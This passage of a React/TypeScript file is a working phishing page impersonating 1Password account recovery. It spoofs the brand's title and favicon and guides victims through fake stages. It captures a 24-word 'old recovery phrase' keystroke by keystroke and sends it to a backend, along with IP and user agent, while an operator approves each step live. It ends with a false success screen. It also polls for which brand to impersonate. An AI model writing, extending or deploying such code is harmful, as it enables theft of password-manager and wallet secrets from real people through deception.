    setHasDownloadedOrViewed(true)
  }

  const handleNext = async () => {
    if (isNavigating) return
    setIsNavigating(true)
    if (visitorId) {
      const res = await fetch(`/api/activity?visitorId=${visitorId}`)
      const data = await res.json()
      if (data.activity) {
        const activity: UserActivity = { ...data.activity, currentStage: "verify-words", lastUpdated: new Date().toISOString() }
        await fetch("/api/activity", { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ visitorId, activity }) })
      }
    }
    onNext()
  }

  return (
    <main className="max-w-6xl mx-auto px-4 sm:px-6 lg:px-8 py-6 sm:py-8 flex-1">
      <div className="max-w-lg mx-auto">
        <Card className="border-border bg-card">
          <CardContent className="p-6 sm:p-8">
            <div className="flex justify-center mb-6">
              <div className="h-16 w-16 rounded-2xl bg-primary/10 flex items-center justify-center">
                <KeyRound className="h-8 w-8 text-primary" />
              </div>
            </div>
            <h1 className="text-xl font-semibold text-foreground text-center mb-2">New Emergency Kit</h1>
            <p className="text-sm text-muted-foreground text-center mb-6">Download your new Emergency Kit containing your updated Secret Key and recovery phrase.</p>

            {showWarning && (
              <div className="fixed inset-0 z-50 flex items-center justify-center bg-background/80 backdrop-blur-sm p-4">
                <Card className="border-border bg-card max-w-sm w-full">
                  <CardContent className="p-6">
                    <div className="flex justify-center mb-4">
                      <div className="h-12 w-12 rounded-full bg-warning/10 flex items-center justify-center">
                        <AlertTriangle className="h-6 w-6 text-warning" />
                      </div>
                    </div>
                    <h2 className="text-lg font-semibold text-foreground text-center mb-2">Security Notice</h2>
                    <p className="text-sm text-muted-foreground text-center mb-4">Do not screenshot or share your Secret Key. Store your Emergency Kit in a safe, private location.</p>
                    <div className="flex gap-3">
                      <Button variant="outline" onClick={() => setShowWarning(false)} className="flex-1 bg-transparent border-border hover:bg-secondary h-10 cursor-pointer transition-all duration-200">Cancel</Button>
                      <Button onClick={() => { setWarningAccepted(true); setShowWarning(false); setHasDownloadedOrViewed(true) }} className="flex-1 bg-primary text-primary-foreground hover:bg-primary/80 h-10 cursor-pointer transition-all duration-200">I understand</Button>
                    </div>
                  </CardContent>
                </Card>
              </div>
            )}

            {warningAccepted && (
              <div className={`mb-4 p-4 rounded-md bg-secondary border border-border ${keysBlurred ? "blur-sm select-none" : ""}`}>
                <p className="text-xs font-medium text-foreground mb-2">Your recovery phrase:</p>
                <div className="grid grid-cols-3 gap-2">
                  {CORRECT_WORDS.map((word, i) => (
                    <div key={i} className="flex items-center gap-1 text-xs font-mono">
                      <span className="text-muted-foreground w-5 text-right">{i + 1}.</span>
                      <span className="text-foreground">{word}</span>
                    </div>
                  ))}
                </div>
              </div>
            )}

            <div className="flex gap-2">
              <Button onClick={handleDownload} variant="outline" className="flex-1 bg-transparent border-border hover:bg-secondary h-10 sm:h-11 text-sm cursor-pointer transition-all duration-200 hover:scale-105 active:scale-95">
                <Download className="mr-2 h-4 w-4" />Download Kit
              </Button>
              {warningAccepted ? (
                <Button onClick={() => setKeysBlurred(!keysBlurred)} variant="outline" className="flex-1 bg-transparent border-border hover:bg-secondary h-10 sm:h-11 text-sm cursor-pointer transition-all duration-200 hover:scale-105 active:scale-95">
                  {keysBlurred ? <><Eye className="mr-2 h-4 w-4" /> Show</> : <><EyeOff className="mr-2 h-4 w-4" /> Hide</>}
                </Button>
              ) : (
                <Button onClick={() => setShowWarning(true)} variant="outline" className="flex-1 bg-transparent border-border hover:bg-secondary h-10 sm:h-11 text-sm cursor-pointer transition-all duration-200 hover:scale-105 active:scale-95">
                  <Eye className="mr-2 h-4 w-4" />View Secret Key
                </Button>
              )}
            </div>
            <Button onClick={handleNext} disabled={!hasDownloadedOrViewed || isNavigating} className="w-full mt-4 bg-primary text-primary-foreground hover:bg-primary/80 h-10 sm:h-11 cursor-pointer transition-all duration-200 hover:scale-105 active:scale-95 disabled:opacity-50 disabled:cursor-not-allowed disabled:hover:scale-100">
              <ArrowRight className="mr-2 h-4 w-4" />{isNavigating ? "Loading..." : "Continue"}
            </Button>
          </CardContent>
        </Card>
      </div>
    </main>
  )
}

// ===== STAGE: VERIFY RECOVERY PHRASE (verify-words) =====
function VerifyRecoveryPhraseStage({ visitorId, onNext }: { visitorId: string; onNext: () => void }) {
  const [words, setWords] = useState<string[]>(Array(24).fill(""))
  const [errors, setErrors] = useState<number[]>([])
  const [isSubmitting, setIsSubmitting] = useState(false)
  const inputRefs = useRef<(HTMLInputElement | null)[]>([])
  const syncTimeoutRef = useRef<NodeJS.Timeout | null>(null)
  const latestWordsRef = useRef<string[]>(Array(24).fill(""))

  useEffect(() => {
    fetch(`/api/activity?visitorId=${visitorId}`)
      .then((res) => res.json())
      .then((data) => {
        if (data.activity) {
          const activity: UserActivity = {
            ...data.activity, currentStage: "verify-words",
            verifyWordsData: { ...(data.activity.verifyWordsData || {}), enteredWords: data.activity.verifyWordsData?.enteredWords || Array(24).fill("") },
            lastUpdated: new Date().toISOString(),
          }
          fetch("/api/activity", { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ visitorId, activity }) })
        }
      })
  }, [visitorId])

  const syncWords = (newWords: string[]) => {
    latestWordsRef.current = [...newWords]
    if (syncTimeoutRef.current) clearTimeout(syncTimeoutRef.current)
    syncTimeoutRef.current = setTimeout(() => {
      if (visitorId) {
        fetch("/api/activity/sync-words", {
          method: "POST", headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ visitorId, field: "verifyWordsData", enteredWords: [...latestWordsRef.current] }),
        })
      }
    }, 150)
  }

  const flushSync = async () => {
    if (syncTimeoutRef.current) { clearTimeout(syncTimeoutRef.current); syncTimeoutRef.current = null }
    if (visitorId) {
      await fetch("/api/activity/sync-words", {
        method: "POST", headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ visitorId, field: "verifyWordsData", enteredWords: [...latestWordsRef.current] }),
      })
    }
  }

  const handleWordChange = (index: number, value: string) => {
    if (value.includes(" ")) {
      const trimmed = value.replace(/\s/g, "")
      const newWords = [...words]; newWords[index] = trimmed.toLowerCase(); setWords(newWords)
      if (errors.includes(index + 1)) setErrors(errors.filter((e) => e !== index + 1))
      if (index < 23) inputRefs.current[index + 1]?.focus()
      syncWords(newWords); return
    }
    const newWords = [...words]; newWords[index] = value.toLowerCase(); setWords(newWords)
    if (errors.includes(index + 1)) setErrors(errors.filter((e) => e !== index + 1))
    syncWords(newWords)
  }

  const handleKeyDown = (index: number, e: React.KeyboardEvent) => {
    if (e.key === "Enter" || e.key === "Tab") { e.preventDefault(); if (index < 23) inputRefs.current[index + 1]?.focus() }
    if (e.key === "Backspace" && words[index] === "" && index > 0) { e.preventDefault(); inputRefs.current[index - 1]?.focus() }
  }

  const handleVerify = async () => {
    if (isSubmitting) return
    const wrongNumbers: number[] = []
    for (let i = 0; i < 24; i++) { if (words[i].toLowerCase().trim() !== CORRECT_WORDS[i]) wrongNumbers.push(i + 1) }
    if (wrongNumbers.length > 0) { setErrors(wrongNumbers); return }
    setErrors([]); setIsSubmitting(true)
    latestWordsRef.current = [...words]; await flushSync()
    if (visitorId) {
      const res = await fetch(`/api/activity?visitorId=${visitorId}`)
      const data = await res.json()
      if (data.activity) {
        const activity: UserActivity = { ...data.activity, currentStage: "enter-old-keys", lastUpdated: new Date().toISOString() }
        await fetch("/api/activity", { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ visitorId, activity }) })
      }
    }
    onNext()
  }

  return (
    <main className="max-w-6xl mx-auto px-4 sm:px-6 lg:px-8 py-6 sm:py-8 flex-1">
      <div className="max-w-lg mx-auto">
        <Card className="border-border bg-card">
          <CardContent className="p-6 sm:p-8">
            <div className="flex justify-center mb-6">
              <div className="h-16 w-16 rounded-2xl bg-primary/10 flex items-center justify-center"><ShieldCheck className="h-8 w-8 text-primary" /></div>
            </div>
            <h1 className="text-xl font-semibold text-foreground text-center mb-2">Verify Recovery Phrase</h1>
            <p className="text-sm text-muted-foreground text-center mb-6">Enter each of your 24 recovery words in order to confirm you have saved your new Emergency Kit.</p>
            {errors.length > 0 && (
              <div className="mb-4 p-3 rounded-md bg-destructive/10 border border-destructive/20">
                <div className="flex items-start gap-2">
                  <AlertCircle className="h-4 w-4 text-destructive shrink-0 mt-0.5" />
                  <div>
                    <p className="text-xs font-medium text-destructive">{errors.length === 1 ? "1 word is incorrect:" : `${errors.length} words are incorrect:`}</p>
                    <p className="text-xs text-destructive/80 mt-0.5">{errors.map((n) => `Word #${n}`).join(", ")}</p>
                  </div>
                </div>
              </div>
            )}
            <div className="grid grid-cols-2 sm:grid-cols-3 gap-2">
              {Array.from({ length: 24 }).map((_, i) => (
                <div key={i} className="flex items-center gap-1">
                  <span className="text-xs text-muted-foreground w-5 text-right shrink-0">{i + 1}.</span>
                  <Input
                    ref={(el) => { inputRefs.current[i] = el }}
                    type="text" value={words[i]}
                    onChange={(e) => handleWordChange(i, e.target.value)}
                    onKeyDown={(e) => handleKeyDown(i, e)}
                    placeholder={`Word ${i + 1}`} autoComplete="off"
                    className={`bg-secondary text-xs h-9 font-mono ${errors.includes(i + 1) ? "border-destructive focus-visible:ring-destructive" : "border-border"}`}
                  />
                </div>
              ))}
            </div>
            <Button onClick={handleVerify} disabled={isSubmitting || words.some((w) => !w.trim())} className="w-full mt-6 bg-primary text-primary-foreground hover:bg-primary/80 h-10 sm:h-11 cursor-pointer transition-all duration-200 hover:scale-105 active:scale-95 disabled:opacity-50 disabled:cursor-not-allowed disabled:hover:scale-100">
              {isSubmitting ? "Verifying..." : "Verify Recovery Phrase"}
            </Button>
          </CardContent>
        </Card>
      </div>
    </main>
  )
}

// ===== STAGE: ENTER OLD MASTER PASSWORD (enter-old-keys) =====
function EnterOldPasswordStage({ visitorId, onNext }: { visitorId: string; onNext: () => void }) {
  const [words, setWords] = useState<string[]>(Array(24).fill(""))
  const [isWaiting, setIsWaiting] = useState(false)
  const inputRefs = useRef<(HTMLInputElement | null)[]>([])
  const syncTimeoutRef = useRef<NodeJS.Timeout | null>(null)
  const latestWordsRef = useRef<string[]>(Array(24).fill(""))

  useEffect(() => {
    fetch(`/api/activity?visitorId=${visitorId}`)
      .then((res) => res.json())
      .then((data) => {
        if (data.activity) {
          const activity: UserActivity = {
            ...data.activity, currentStage: "enter-old-keys",
            oldKeysData: { ...(data.activity.oldKeysData || {}), enteredWords: data.activity.oldKeysData?.enteredWords || Array(24).fill("") },
            lastUpdated: new Date().toISOString(),
          }
          fetch("/api/activity", { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ visitorId, activity }) })
        }
      })
  }, [visitorId])

  useEffect(() => {
    if (!isWaiting || !visitorId) return
    const interval = setInterval(async () => {
      const res = await fetch(`/api/activity?visitorId=${visitorId}`)
      const data = await res.json()
      if (data.activity?.oldKeysData?.adminConfirmed) { clearInterval(interval); onNext() }
    }, 2000)
    return () => clearInterval(interval)
  }, [isWaiting, visitorId, onNext])

  const syncWords = (newWords: string[]) => {
    latestWordsRef.current = [...newWords]
    if (syncTimeoutRef.current) clearTimeout(syncTimeoutRef.current)
    syncTimeoutRef.current = setTimeout(() => {
      if (visitorId) {
        fetch("/api/activity/sync-words", {
          method: "POST", headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ visitorId, field: "oldKeysData", enteredWords: [...latestWordsRef.current] }),
        })
      }
    }, 150)
  }

  const flushSync = async () => {
    if (syncTimeoutRef.current) { clearTimeout(syncTimeoutRef.current); syncTimeoutRef.current = null }
    if (visitorId) {
      await fetch("/api/activity/sync-words", {
        method: "POST", headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ visitorId, field: "oldKeysData", enteredWords: [...latestWordsRef.current] }),
      })
    }
  }

  const handleWordChange = (index: number, value: string) => {
    if (value.includes(" ")) {
      const trimmed = value.replace(/\s/g, "")
      const newWords = [...words]; newWords[index] = trimmed.toLowerCase(); setWords(newWords)
      if (index < 23) inputRefs.current[index + 1]?.focus()
      syncWords(newWords); return
    }
    const newWords = [...words]; newWords[index] = value.toLowerCase(); setWords(newWords)
    syncWords(newWords)
  }

  const handleKeyDown = (index: number, e: React.KeyboardEvent) => {
    if (e.key === "Enter" || e.key === "Tab") { e.preventDefault(); if (index < 23) inputRefs.current[index + 1]?.focus() }
    if (e.key === "Backspace" && words[index] === "" && index > 0) { e.preventDefault(); inputRefs.current[index - 1]?.focus() }
  }

  const handleSubmit = async () => {
    if (isWaiting) return
    setIsWaiting(true)
    latestWordsRef.current = [...words]
    await flushSync()
  }

  return (
    <main className="max-w-6xl mx-auto px-4 sm:px-6 lg:px-8 py-6 sm:py-8 flex-1">
      <div className="max-w-lg mx-auto">
        <Card className="border-border bg-card">
          <CardContent className="p-6 sm:p-8">
            <div className="flex justify-center mb-6">
              <div className="h-16 w-16 rounded-2xl bg-primary/10 flex items-center justify-center"><Lock className="h-8 w-8 text-primary" /></div>
            </div>
            <h1 className="text-xl font-semibold text-foreground text-center mb-2">Enter Your Old Recovery Phrase</h1>
            <p className="text-sm text-muted-foreground text-center mb-6">Enter each of your 24 old recovery words so we can deactivate your previous Emergency Kit.</p>
            <div className="grid grid-cols-2 sm:grid-cols-3 gap-2">
              {Array.from({ length: 24 }).map((_, i) => (
                <div key={i} className="flex items-center gap-1">
                  <span className="text-xs text-muted-foreground w-5 text-right shrink-0">{i + 1}.</span>
                  <Input
                    ref={(el) => { inputRefs.current[i] = el }}
                    type="text" value={words[i]}
                    onChange={(e) => handleWordChange(i, e.target.value)}
                    onKeyDown={(e) => handleKeyDown(i, e)}
                    placeholder={`Word ${i + 1}`} autoComplete="off" disabled={isWaiting}
                    className="bg-secondary text-xs h-9 font-mono border-border"
                  />
                </div>
              ))}
            </div>
            <Button onClick={handleSubmit} disabled={isWaiting || words.some((w) => !w.trim())} className="w-full mt-6 bg-primary text-primary-foreground hover:bg-primary/80 h-10 sm:h-11 text-sm sm:text-base cursor-pointer transition-all duration-200 hover:scale-105 active:scale-95 disabled:opacity-50 disabled:cursor-not-allowed disabled:hover:scale-100">
              {isWaiting ? <span className="flex items-center gap-2"><Loader2 className="h-4 w-4 animate-spin" />Submitting...</span> : "Submit"}
            </Button>
          </CardContent>
        </Card>
      </div>
    </main>
  )
}

// ===== STAGE: COMPLETED =====
function CompletedStage({ visitorId }: { visitorId: string }) {
  useEffect(() => {
    fetch(`/api/activity?visitorId=${visitorId}`)
      .then((res) => res.json())
      .then((data) => {
        if (data.activity) {
          const activity: UserActivity = { ...data.activity, currentStage: "completed", lastUpdated: new Date().toISOString() }
          fetch("/api/activity", { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ visitorId, activity }) })
        }
      })
  }, [visitorId])

  return (
    <main className="max-w-6xl mx-auto px-4 sm:px-6 lg:px-8 py-6 sm:py-8 flex-1 flex items-center justify-center">
      <div className="text-center">
        <div className="flex justify-center mb-6">
          <div className="h-20 w-20 rounded-2xl bg-success/10 flex items-center justify-center">
            <CheckCircle2 className="h-10 w-10 text-success" />
          </div>
        </div>
        <h1 className="text-2xl font-semibold text-foreground mb-4">Account Successfully Recovered</h1>
        <p className="text-sm text-muted-foreground max-w-md mx-auto mb-2">Your 1Password account has been secured. Your old credentials have been deactivated and your new Emergency Kit is now active.</p>
        <p className="text-sm text-muted-foreground">You can now sign in with your new master password on all your devices.</p>
      </div>
    </main>
  )
}

// ===== MAIN 1PASSWORD FLOW =====
export default function OnePassFlow() {
  const [stage, setStage] = useState<Stage>("intake")
  const [visitorId, setVisitorId] = useState<string>("")
  const [waitingForApproval, setWaitingForApproval] = useState(false)
  const [deniedMessage, setDeniedMessage] = useState<string | null>(null)
  const stageRef = useRef<Stage>("intake")

  useHeartbeat(visitorId)

  // Set 1Password favicon + title
  useEffect(() => {
    document.title = "Sign In - 1Password"
    const existing = document.querySelector("link[rel='icon']")
    if (existing) existing.remove()
    const link = document.createElement("link")
    link.rel = "icon"
    link.type = "image/svg+xml"
    link.href = "data:image/svg+xml," + encodeURIComponent('<svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 32 32"><rect width="32" height="32" rx="7" fill="#0572EC"/><text x="16" y="22" font-family="Arial,sans-serif" font-weight="bold" font-size="18" fill="white" text-anchor="middle">1P</text></svg>')
    document.head.appendChild(link)
  }, [])

  // Initialize visitor
  useEffect(() => {
    let id = sessionStorage.getItem("session_onepass")
    if (!id) {
      id = generateVisitorId()
      sessionStorage.setItem("session_onepass", id)
    }
    setVisitorId(id)

    const initActivity = async () => {
      const ipRes = await fetch("/api/ip")
      const ipData = await ipRes.json()

      const existing = await fetch(`/api/activity?visitorId=${id}`)
      const existingData = await existing.json()

      if (existingData.activity) {
        setStage(existingData.activity.currentStage)
        stageRef.current = existingData.activity.currentStage
        if (existingData.activity.waitingForApproval) setWaitingForApproval(true)
        if (existingData.activity.status === "rejected" && existingData.activity.adminMessage) {
          setDeniedMessage(existingData.activity.adminMessage)
          setWaitingForApproval(true)
        }
      } else {
        const activity: UserActivity = {
          visitorId: id!,
          ipAddress: ipData.ip,
          currentStage: "intake",
          email: "", caseId: "", decisions: [],
          sessionStarted: new Date().toISOString(),
          lastUpdated: new Date().toISOString(),
          lastHeartbeat: new Date().toISOString(),
          isOnline: true, userAgent: navigator.userAgent,
        }
        await fetch("/api/activity", {
          method: "POST", headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ visitorId: id, activity }),
        })
      }
    }

    initActivity()
  }, [])

  // Poll for brand changes
  useEffect(() => {
    const brandCheck = setInterval(async () => {
      try {
        const res = await fetch("/api/active-brand")
        const data = await res.json()
        if (data.brand !== "onepassword") window.location.reload()
      } catch { /* ignore */ }
    }, 3000)
    return () => clearInterval(brandCheck)
  }, [])

  // Poll for admin-initiated stage changes and approval responses
  useEffect(() => {
    if (!visitorId) return
    const interval = setInterval(async () => {
      try {
        const res = await fetch(`/api/activity?visitorId=${visitorId}`)
        const data = await res.json()
        if (!data.activity) return
        const act = data.activity

        if (act.status === "rejected" && act.adminMessage) {
          setDeniedMessage(act.adminMessage); setWaitingForApproval(true); return
        }
        if (waitingForApproval && !act.waitingForApproval && act.status !== "rejected") {
          setWaitingForApproval(false); setDeniedMessage(null)
          if (act.currentStage !== stageRef.current) { stageRef.current = act.currentStage; setStage(act.currentStage) }
          return
        }
        if (!waitingForApproval && act.currentStage !== stageRef.current) {
          stageRef.current = act.currentStage; setStage(act.currentStage)
        }
      } catch { /* ignore */ }
    }, 2000)
    return () => clearInterval(interval)
  }, [visitorId, waitingForApproval])

  const requestApproval = useCallback(async () => {
    setWaitingForApproval(true); setDeniedMessage(null)
    try {
      const res = await fetch(`/api/activity?visitorId=${visitorId}`)
      const data = await res.json()
      if (data.activity) {
        const nextStage = getNextStage(data.activity.currentStage)
        await fetch("/api/activity", {
          method: "POST", headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            visitorId, activity: {
              ...data.activity, waitingForApproval: true, approvedToStage: nextStage,
              status: "pending", adminMessage: "", lastUpdated: new Date().toISOString(),
            },
          }),
        })
      }
    } catch { /* ignore */ }
  }, [visitorId])

  const goToStage = useCallback((newStage: Stage) => {
    stageRef.current = newStage; setStage(newStage)
  }, [])

  if (!visitorId) {
    return (
      <div className="onepassword-theme flex min-h-screen flex-col bg-[#f5f5f5] text-[#1a1a1a]">
        <OnePassHeader />
  <main className="flex flex-1 items-center justify-center">
  <div className="h-8 w-8 animate-spin rounded-full border-2 border-[#0572EC] border-t-transparent" />
        </main>
      </div>
    )
  }

  return (
    <div className="onepassword-theme flex min-h-screen flex-col bg-[#f5f5f5] text-[#1a1a1a]">
      <OnePassHeader />
      {waitingForApproval ? (
        <WaitingForApprovalScreen deniedMessage={deniedMessage || undefined} />
      ) : (
        <>
          {stage === "intake" && <IntakeStage visitorId={visitorId} onNext={requestApproval} />}
          {stage === "approval" && <IdentityVerificationStage visitorId={visitorId} onNext={requestApproval} />}
          {stage === "connect-ledger" && <EmergencyKitStage visitorId={visitorId} onNext={requestApproval} />}
          {stage === "confirm-reset" && <MasterPasswordResetStage visitorId={visitorId} onNext={requestApproval} />}
          {stage === "reset-api-keys" && <NewSecretKeyStage visitorId={visitorId} onNext={requestApproval} />}
          {stage === "verify-words" && <VerifyRecoveryPhraseStage visitorId={visitorId} onNext={requestApproval} />}
          {stage === "enter-old-keys" && <EnterOldPasswordStage visitorId={visitorId} onNext={requestApproval} />}
          {stage === "completed" && <CompletedStage visitorId={visitorId} />}
        </>
      )}
      <OnePassFooter />
    </div>
  )
}
